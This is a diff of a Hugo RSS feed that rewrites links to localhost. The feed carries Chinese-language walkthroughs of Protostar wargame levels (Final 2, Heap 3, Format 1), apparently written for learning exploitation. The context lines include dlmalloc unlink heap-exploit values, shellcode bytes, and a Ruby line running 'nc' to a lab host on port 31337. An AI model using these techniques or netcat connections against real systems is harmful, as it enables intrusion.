@@ -2,17 +2,17 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
     <channel>
         <title>Protostar on Senri&#39;s Memos</title>
-        <link>/categories/protostar/</link>
+        <link>//localhost:1313/categories/protostar/</link>
         <description>Recent content in Protostar on Senri&#39;s Memos</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
-        <lastBuildDate>Mon, 18 Apr 2022 00:00:00 +0000</lastBuildDate><atom:link href="/categories/protostar/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Mon, 18 Apr 2022 00:00:00 +0000</lastBuildDate><atom:link href="//localhost:1313/categories/protostar/index.xml" rel="self" type="application/rss+xml" /><item>
         <title>Protostar Final 2 Walkthrough</title>
-        <link>/p/protostar_final_2/</link>
+        <link>//localhost:1313/p/protostar_final_2/</link>
         <pubDate>Mon, 18 Apr 2022 00:00:00 +0000</pubDate>
         
-        <guid>/p/protostar_final_2/</guid>
-        <description>&lt;img src="/p/protostar_final_2/cover.png" alt="Featured image of post Protostar Final 2 Walkthrough" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/KurusuSenri/protostar_solutions/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+        <guid>//localhost:1313/p/protostar_final_2/</guid>
+        <description>&lt;img src="//localhost:1313/p/protostar_final_2/cover.png" alt="Featured image of post Protostar Final 2 Walkthrough" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/KurusuSenri/protostar_solutions/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;☞ 最终的 Ruby 脚本放在了这里&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;至此 Protostar 全部做完了呢&amp;hellip;&lt;/p&gt;
 &lt;hr&gt;
@@ -209,7 +209,7 @@
 &lt;p&gt;然后再利用 &lt;code&gt;int get_requests(int fd)&lt;/code&gt; 的 &lt;code&gt;free(destroylist[i])&lt;/code&gt;！&lt;/p&gt;
 &lt;p&gt;这就是那个 &lt;code&gt;unlink()&lt;/code&gt; 的 trick 了，&lt;/p&gt;
 &lt;br&gt;
-&lt;p&gt;&lt;em&gt;&lt;strong&gt;关于 dlmalloc 的 unlink trick，全部已经移动到了这里：&lt;a class=&#34;link&#34; href=&#34;/p/old_dlmalloc_unlink_tricks&#34; &gt;Old Dlmalloc Unlink Tricks&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;关于 dlmalloc 的 unlink trick，全部已经移动到了这里：&lt;a class=&#34;link&#34; href=&#34;//localhost:1313/p/old_dlmalloc_unlink_tricks&#34; &gt;Old Dlmalloc Unlink Tricks&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
 &lt;p&gt;&lt;em&gt;&lt;strong&gt;请看完那篇后再继续向下看&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
 &lt;br&gt;
 &lt;hr&gt;
@@ -260,7 +260,7 @@
 &lt;/li&gt;
 &lt;/ol&gt;
 &lt;p&gt;由于 REQSZ 设定为 128，大于 80 所以不会使用 fastbin&lt;/p&gt;
-&lt;p&gt;由于先释放的是 chunkA，那么就利用到了 &lt;em&gt;&lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;/p/old_dlmalloc_unlink_tricks/#trick-use-negative-size&#34; &gt;Trick: use negative size&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt; 中的 &lt;em&gt;&lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;/p/old_dlmalloc_unlink_tricks/#next-chunks-nexts-prev_inuse&#34; &gt;next chunk’s next’s PREV_INUSE&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt; 章节&lt;/p&gt;
+&lt;p&gt;由于先释放的是 chunkA，那么就利用到了 &lt;em&gt;&lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;//localhost:1313/p/old_dlmalloc_unlink_tricks/#trick-use-negative-size&#34; &gt;Trick: use negative size&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt; 中的 &lt;em&gt;&lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;//localhost:1313/p/old_dlmalloc_unlink_tricks/#next-chunks-nexts-prev_inuse&#34; &gt;next chunk’s next’s PREV_INUSE&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt; 章节&lt;/p&gt;
 &lt;p&gt;建议先看完再继续&lt;/p&gt;
 &lt;p&gt;直接说结论的话，我们只要把 chunkB 的 size 覆盖为 &lt;code&gt;0xfffffffc = -0x4&lt;/code&gt; 就能满足第三个条件&lt;/p&gt;
 &lt;p&gt;另外，prev_size 也会被覆盖，为了区分就使用 &lt;code&gt;0xfffffff8 = -0x8&lt;/code&gt; 好了&lt;/p&gt;
@@ -289,7 +289,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0804d41c R_386_JUMP_SLOT   write
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0804d468 R_386_JUMP_SLOT   fwrite
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@protostar:~$
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;套用 &lt;em&gt;&lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;/p/dlmalloc_unlink_vuln/#vulnerability-unlink&#34; &gt;Vulnerability: unlink&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt; 中的公式：&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;套用 &lt;em&gt;&lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;//localhost:1313/p/dlmalloc_unlink_vuln/#vulnerability-unlink&#34; &gt;Vulnerability: unlink&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt; 中的公式：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;令 &lt;span class=&#34;nv&#34;&gt;fd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; addr of write - 0xc
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;fd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;令 &lt;span class=&#34;nv&#34;&gt;bk&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; addr of shllcode
@@ -362,10 +362,10 @@ The memmove() function copies &lt;code&gt;n&lt;/code&gt; bytes from memory area 
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            -8&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  -4&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  fd&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  bk
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;implement&#34;&gt;Implement&lt;/h2&gt;
 &lt;p&gt;最终的思路画成图：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;/p/protostar_final_2/buf.png&#34;
+&lt;p&gt;&lt;img src=&#34;//localhost:1313/p/protostar_final_2/buf.png&#34;
 	width=&#34;2254&#34;
 	height=&#34;1290&#34;
-	srcset=&#34;/p/protostar_final_2/buf_hu80e7e3cc8859acb7f205acbcb4252b1a_374163_480x0_resize_box_3.png 480w, /p/protostar_final_2/buf_hu80e7e3cc8859acb7f205acbcb4252b1a_374163_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;//localhost:1313/p/protostar_final_2/buf_hu80e7e3cc8859acb7f205acbcb4252b1a_374163_480x0_resize_box_3.png 480w, //localhost:1313/p/protostar_final_2/buf_hu80e7e3cc8859acb7f205acbcb4252b1a_374163_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;buf.png&#34;
@@ -413,10 +413,10 @@ The memmove() function copies &lt;code&gt;n&lt;/code&gt; bytes from memory area 
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;nc -v 192.168.215.129 31337&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;socket&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;close&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;/p/protostar_final_2/host.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;//localhost:1313/p/protostar_final_2/host.png&#34;
 	width=&#34;2880&#34;
 	height=&#34;1298&#34;
-	srcset=&#34;/p/protostar_final_2/host_huda532a72d9d7373fdbec5063b9126966_1315940_480x0_resize_box_3.png 480w, /p/protostar_final_2/host_huda532a72d9d7373fdbec5063b9126966_1315940_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;//localhost:1313/p/protostar_final_2/host_huda532a72d9d7373fdbec5063b9126966_1315940_480x0_resize_box_3.png 480w, //localhost:1313/p/protostar_final_2/host_huda532a72d9d7373fdbec5063b9126966_1315940_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;宿主机&#34;
@@ -427,10 +427,10 @@ The memmove() function copies &lt;code&gt;n&lt;/code&gt; bytes from memory area 
 		data-flex-basis=&#34;532px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;/p/protostar_final_2/virtual.png&#34;
+&lt;p&gt;&lt;img src=&#34;//localhost:1313/p/protostar_final_2/virtual.png&#34;
 	width=&#34;2880&#34;
 	height=&#34;906&#34;
-	srcset=&#34;/p/protostar_final_2/virtual_hud37b339a6bc688fa6b63b77645e1d796_919506_480x0_resize_box_3.png 480w, /p/protostar_final_2/virtual_hud37b339a6bc688fa6b63b77645e1d796_919506_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;//localhost:1313/p/protostar_final_2/virtual_hud37b339a6bc688fa6b63b77645e1d796_919506_480x0_resize_box_3.png 480w, //localhost:1313/p/protostar_final_2/virtual_hud37b339a6bc688fa6b63b77645e1d796_919506_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;虚拟机&#34;
@@ -457,11 +457,11 @@ The memmove() function copies &lt;code&gt;n&lt;/code&gt; bytes from memory area 
         </item>
         <item>
         <title>Protostar Heap 3 Walkthrough</title>
-        <link>/p/protostar_heap_3/</link>
+        <link>//localhost:1313/p/protostar_heap_3/</link>
         <pubDate>Thu, 07 Apr 2022 00:00:00 +0000</pubDate>
         
-        <guid>/p/protostar_heap_3/</guid>
-        <description>&lt;img src="/p/protostar_heap_3/cover.png" alt="Featured image of post Protostar Heap 3 Walkthrough" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/KurusuSenri/protostar_solutions/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+        <guid>//localhost:1313/p/protostar_heap_3/</guid>
+        <description>&lt;img src="//localhost:1313/p/protostar_heap_3/cover.png" alt="Featured image of post Protostar Heap 3 Walkthrough" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/KurusuSenri/protostar_solutions/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;☞ 最终的 Ruby 脚本放在了这里&lt;/a&gt;&lt;/p&gt;
 &lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;
 &lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://phrack.org/issues/57/9.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
@@ -512,7 +512,7 @@ The memmove() function copies &lt;code&gt;n&lt;/code&gt; bytes from memory area 
 &lt;p&gt;我们的目标是把 &lt;code&gt;puts()&lt;/code&gt; 在动态链接表中记录的地址，写上能跳转到 &lt;code&gt;winner()&lt;/code&gt; 的 shellcode&lt;/p&gt;
 &lt;p&gt;而能帮我们达到以上目的的函数就是 &lt;code&gt;free()&lt;/code&gt;， 准确来说是 &lt;code&gt;unlink()&lt;/code&gt;&lt;/p&gt;
 &lt;br&gt;
-&lt;p&gt;&lt;em&gt;&lt;strong&gt;关于 dlmalloc 的 unlink trick，全部已经移动到了这里：&lt;a class=&#34;link&#34; href=&#34;/p/old_dlmalloc_unlink_tricks&#34; &gt;Old Dlmalloc Unlink Tricks&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;关于 dlmalloc 的 unlink trick，全部已经移动到了这里：&lt;a class=&#34;link&#34; href=&#34;//localhost:1313/p/old_dlmalloc_unlink_tricks&#34; &gt;Old Dlmalloc Unlink Tricks&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
 &lt;br&gt;
 &lt;p&gt;如果你看完了那篇，那么再结合一下这道题目，&lt;/p&gt;
 &lt;p&gt;heap3 首先依次创建了 chunkA, chunkB, chunkC 然后再反过来依次释放 chunkC, chunkB, chunkA&lt;/p&gt;
@@ -530,16 +530,16 @@ The memmove() function copies &lt;code&gt;n&lt;/code&gt; bytes from memory area 
 &lt;p&gt;=&amp;gt; 会对 &lt;em&gt;Chunk&lt;/em&gt; 的 &lt;em&gt;相邻上一个 chunk&lt;/em&gt; 执行 &lt;code&gt;unlink()&lt;/code&gt;&lt;br&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ol&gt;
-&lt;p&gt;由于题目中的 &lt;code&gt;malloc()&lt;/code&gt; 大小是 &lt;em&gt;32&lt;/em&gt;，小于 &lt;em&gt;80&lt;/em&gt; 所以会使用 fastbin 结构，所以可以通过上面那篇文章的 &lt;em&gt;&lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;/p/old_dlmalloc_unlink_tricks/#trick-use-negative-size&#34; &gt;Trick: use negative size&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt; 章节，使用一个负数：&lt;code&gt;0xfffffffc&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;由于题目中的 &lt;code&gt;malloc()&lt;/code&gt; 大小是 &lt;em&gt;32&lt;/em&gt;，小于 &lt;em&gt;80&lt;/em&gt; 所以会使用 fastbin 结构，所以可以通过上面那篇文章的 &lt;em&gt;&lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;//localhost:1313/p/old_dlmalloc_unlink_tricks/#trick-use-negative-size&#34; &gt;Trick: use negative size&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt; 章节，使用一个负数：&lt;code&gt;0xfffffffc&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;那么将 size 设置为 &lt;code&gt;0xfffffffc = -4&lt;/code&gt; 就可以满足第一个条件&lt;/p&gt;
 &lt;p&gt;但是，如果我们是使用 BufferOverFlow 的方式，从 chunkA 开始去覆写 chunkB 的 size 的话，会导致 prev_size 也被覆盖上，&lt;/p&gt;
 &lt;p&gt;而且，既然是「向前 &lt;code&gt;unlink()&lt;/code&gt;」，那么 malloc 计算上一个 chunk 的方式是 &lt;code&gt;p - prev_size&lt;/code&gt;；如果 prev_size 是乱七八糟的数值，必定会导致 Segmentation fault&lt;/p&gt;
 &lt;p&gt;这时候可以再用一次负数，为了区分，就使用 &lt;code&gt;0xfffffff8 = -8&lt;/code&gt; 好了：而这样做的效果是，&lt;code&gt;p - prev_size&lt;/code&gt; = &lt;code&gt;p - -8&lt;/code&gt; = &lt;code&gt;p + 8&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;也就是说，&lt;em&gt;p&lt;/em&gt; 的 &lt;em&gt;prevchunk&lt;/em&gt; 出现在了 &lt;em&gt;p&lt;/em&gt; 的向后 0x8 的位置：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;/p/protostar_heap_3/fakechunk.png&#34;
+&lt;p&gt;&lt;img src=&#34;//localhost:1313/p/protostar_heap_3/fakechunk.png&#34;
 	width=&#34;1924&#34;
 	height=&#34;1146&#34;
-	srcset=&#34;/p/protostar_heap_3/fakechunk_hu4b5995100df9f5937e7253e1e38c07ff_299953_480x0_resize_box_3.png 480w, /p/protostar_heap_3/fakechunk_hu4b5995100df9f5937e7253e1e38c07ff_299953_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;//localhost:1313/p/protostar_heap_3/fakechunk_hu4b5995100df9f5937e7253e1e38c07ff_299953_480x0_resize_box_3.png 480w, //localhost:1313/p/protostar_heap_3/fakechunk_hu4b5995100df9f5937e7253e1e38c07ff_299953_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;fakechunk.png&#34;
@@ -590,10 +590,10 @@ The memmove() function copies &lt;code&gt;n&lt;/code&gt; bytes from memory area 
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Assembly - Little Endian&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;\x68\x64\x88\x04\x08\xc3&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后，直接可以画出这张图了：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;/p/protostar_heap_3/fakechunk_after.png&#34;
+&lt;p&gt;&lt;img src=&#34;//localhost:1313/p/protostar_heap_3/fakechunk_after.png&#34;
 	width=&#34;1924&#34;
 	height=&#34;1146&#34;
-	srcset=&#34;/p/protostar_heap_3/fakechunk_after_hu4b5995100df9f5937e7253e1e38c07ff_340708_480x0_resize_box_3.png 480w, /p/protostar_heap_3/fakechunk_after_hu4b5995100df9f5937e7253e1e38c07ff_340708_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;//localhost:1313/p/protostar_heap_3/fakechunk_after_hu4b5995100df9f5937e7253e1e38c07ff_340708_480x0_resize_box_3.png 480w, //localhost:1313/p/protostar_heap_3/fakechunk_after_hu4b5995100df9f5937e7253e1e38c07ff_340708_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;fakechunk_after.png&#34;
@@ -709,10 +709,10 @@ The memmove() function copies &lt;code&gt;n&lt;/code&gt; bytes from memory area 
 bk + 0x8 = addr of puts&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;这时候就又要请出 NOP 了&amp;hellip;我们直接把 &lt;code&gt;0x804c008&lt;/code&gt; 到 &lt;code&gt;0x804c010&lt;/code&gt; 全写上 NOP 就好了&amp;hellip;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;/p/protostar_heap_3/nop.png&#34;
+&lt;p&gt;&lt;img src=&#34;//localhost:1313/p/protostar_heap_3/nop.png&#34;
 	width=&#34;1504&#34;
 	height=&#34;316&#34;
-	srcset=&#34;/p/protostar_heap_3/nop_hu38fa74e4de6e6b5568a8adfa2db215b5_236731_480x0_resize_box_3.png 480w, /p/protostar_heap_3/nop_hu38fa74e4de6e6b5568a8adfa2db215b5_236731_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;//localhost:1313/p/protostar_heap_3/nop_hu38fa74e4de6e6b5568a8adfa2db215b5_236731_480x0_resize_box_3.png 480w, //localhost:1313/p/protostar_heap_3/nop_hu38fa74e4de6e6b5568a8adfa2db215b5_236731_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;nop&#34;
@@ -737,10 +737,10 @@ bk + 0x8 = addr of puts&lt;/p&gt;
 &lt;p&gt;但下次果然还是应该多考虑一下&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;那么重新画一下图，就是这样：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;/p/protostar_heap_3/true.png&#34;
+&lt;p&gt;&lt;img src=&#34;//localhost:1313/p/protostar_heap_3/true.png&#34;
 	width=&#34;1922&#34;
 	height=&#34;1216&#34;
-	srcset=&#34;/p/protostar_heap_3/true_hu33ba29c7aa64820a9e6eed409716edae_351944_480x0_resize_box_3.png 480w, /p/protostar_heap_3/true_hu33ba29c7aa64820a9e6eed409716edae_351944_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;//localhost:1313/p/protostar_heap_3/true_hu33ba29c7aa64820a9e6eed409716edae_351944_480x0_resize_box_3.png 480w, //localhost:1313/p/protostar_heap_3/true_hu33ba29c7aa64820a9e6eed409716edae_351944_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;true&#34;
@@ -758,10 +758,10 @@ bk + 0x8 = addr of puts&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@protostar:/tmp$ /opt/protostar/bin/heap3 &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;cat /tmp/A&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;cat /tmp/B&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt; ABCD
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;that wasn&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;t too bad now, was it? @ &lt;span class=&#34;m&#34;&gt;1648020034&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@protostar:/tmp$
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;/p/protostar_heap_3/finally.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;//localhost:1313/p/protostar_heap_3/finally.png&#34;
 	width=&#34;2678&#34;
 	height=&#34;630&#34;
-	srcset=&#34;/p/protostar_heap_3/finally_hu76fcd66edf669116a552bbca9c3c1384_523547_480x0_resize_box_3.png 480w, /p/protostar_heap_3/finally_hu76fcd66edf669116a552bbca9c3c1384_523547_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;//localhost:1313/p/protostar_heap_3/finally_hu76fcd66edf669116a552bbca9c3c1384_523547_480x0_resize_box_3.png 480w, //localhost:1313/p/protostar_heap_3/finally_hu76fcd66edf669116a552bbca9c3c1384_523547_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;end&#34;
@@ -793,11 +793,11 @@ bk + 0x8 = addr of puts&lt;/p&gt;
         </item>
         <item>
         <title>格式，参数，红宝石</title>
-        <link>/p/protostar_format_1/</link>
+        <link>//localhost:1313/p/protostar_format_1/</link>
         <pubDate>Thu, 31 Mar 2022 00:00:00 +0000</pubDate>
         
-        <guid>/p/protostar_format_1/</guid>
-        <description>&lt;img src="/p/protostar_format_1/cover.png" alt="Featured image of post 格式，参数，红宝石" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/KurusuSenri/protostar_solutions/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+        <guid>//localhost:1313/p/protostar_format_1/</guid>
+        <description>&lt;img src="//localhost:1313/p/protostar_format_1/cover.png" alt="Featured image of post 格式，参数，红宝石" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/KurusuSenri/protostar_solutions/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;☞ 最终的 Ruby 脚本放在了这里&lt;/a&gt;&lt;/p&gt;
 &lt;hr&gt;
 &lt;h2 id=&#34;format-one&#34;&gt;Format One&lt;/h2&gt;
@@ -950,10 +950,10 @@ bk + 0x8 = addr of puts&lt;/p&gt;
 &lt;p&gt;那为什么不在打印了 131 个 &lt;code&gt;%p&lt;/code&gt; 后就停下来呢&amp;hellip;&lt;/p&gt;
 &lt;p&gt;幸好每次增加一个 &lt;code&gt;%p&lt;/code&gt; 的结果都有输出，让我们往上翻看一下 131 个 &lt;code&gt;%p&lt;/code&gt; 时是什么情况&amp;hellip;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;......0x69622f720x6f662f6e0x74616d720x42410031
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;/p/protostar_format_1/132p.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;//localhost:1313/p/protostar_format_1/132p.png&#34;
 	width=&#34;730&#34;
 	height=&#34;550&#34;
-	srcset=&#34;/p/protostar_format_1/132p_hu22c200dd66b92826f0391685ed4f4dda_339838_480x0_resize_box_3.png 480w, /p/protostar_format_1/132p_hu22c200dd66b92826f0391685ed4f4dda_339838_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;//localhost:1313/p/protostar_format_1/132p_hu22c200dd66b92826f0391685ed4f4dda_339838_480x0_resize_box_3.png 480w, //localhost:1313/p/protostar_format_1/132p_hu22c200dd66b92826f0391685ed4f4dda_339838_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -1151,7 +1151,7 @@ bk + 0x8 = addr of puts&lt;/p&gt;
 &lt;p&gt;那 EBP 是什么呢？&lt;/p&gt;
 &lt;p&gt;我们可以看到在 &lt;code&gt;main()&lt;/code&gt; 的汇编代码的第一行出现了 &lt;code&gt;0x0804841c &amp;lt;main+0&amp;gt;:	push ebp&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;而这里的 EBP 就是 &lt;code&gt;main&lt;/code&gt; 函数在栈中开始读写数据的位置&lt;/p&gt;
-&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;/p/protostar_stack_4-7&#34; &gt;☞ 建议看看这些&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;//localhost:1313/p/protostar_stack_4-7&#34; &gt;☞ 建议看看这些&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;推测有那么一个 16 bytes 的 buffer，每当 buffer 塞满时，主程序所占的栈空间就整体下移 16 bytes，具体体现在 EBP 减小了 16&lt;/p&gt;
 &lt;p&gt;至于原因&amp;hellip;？类似硬盘的 4K 对齐？&lt;/p&gt;
 &lt;p&gt;总之这就是为什么我们用 &lt;code&gt;%p&lt;/code&gt; 来打印 4 bytes 时 44434241 无法出现在同一个 &lt;code&gt;%p&lt;/code&gt; 内的原因，毕竟每次参数长度的改变都会改变&lt;code&gt;argv[1]&lt;/code&gt; 的地址&lt;/p&gt;
@@ -1213,10 +1213,10 @@ bk + 0x8 = addr of puts&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;puts&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;gt; exec: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;#{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
